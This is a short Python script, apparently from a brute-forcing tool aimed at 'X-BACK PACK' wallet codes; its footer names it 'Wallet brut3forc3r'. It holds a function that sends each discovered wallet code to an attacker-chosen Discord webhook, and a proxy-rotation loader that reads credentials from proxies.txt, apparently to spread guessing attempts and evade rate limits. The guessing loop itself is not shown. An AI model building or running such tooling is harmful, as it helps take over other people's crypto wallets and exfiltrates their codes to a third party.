import random
from discord_webhook import *

def webhook(code):
    webhook = DiscordWebhook(url ="input_your_webhook",
                            rate_limit_retry=True)
    embed = DiscordEmbed(title=f'X-BACK PACK WALLET CODE FOUND!', color='1982c4')
    embed.set_footer(text=f'Wallet brut3forc3r | by Combo#2137')
    embed.set_timestamp()
    embed.add_embed_field(name='CODE', value=f'||{code}||', inline=True)
    webhook.add_embed(embed)
    response = webhook.execute()

proxies_list = []
    
with open('proxies.txt') as f:
    for line in f:
        proxies_list.append(line.strip())
    f.close()

def get_proxy():
    proxy_chosen = random.choice(proxies_list)
    proxy_ditails = proxy_chosen.split(":")
    proxy = proxy_ditails
    pelneproxy = proxy[2]+":"+proxy[3]+"@"+proxy[0]+":"+proxy[1]
    proxies = {
        'http': 'http://'+pelneproxy,
        'https': 'http://'+pelneproxy
    }
    return proxies